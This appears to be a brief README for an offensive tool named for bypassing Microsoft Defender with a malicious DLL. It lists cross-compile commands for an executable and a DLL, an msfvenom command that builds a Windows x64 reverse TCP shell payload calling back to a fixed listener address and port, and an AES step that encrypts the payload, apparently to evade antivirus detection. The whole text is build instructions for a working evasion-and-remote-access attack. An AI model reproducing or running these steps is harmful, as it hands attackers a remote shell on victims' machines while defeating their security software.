# Defender_bypass_MaliciousDLL_2024
To compile
>x86_64-w64-mingw32-g++ --static -o test.exe process.cpp -fpermissive -lws2_32
>x86_64-w64-mingw32-g++ --static --shared -o start.dll bypassdll.cpp -fpermissive

>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.175 LPORT=8000 -f raw > beacon.bin
>python aes.py beacon.bin
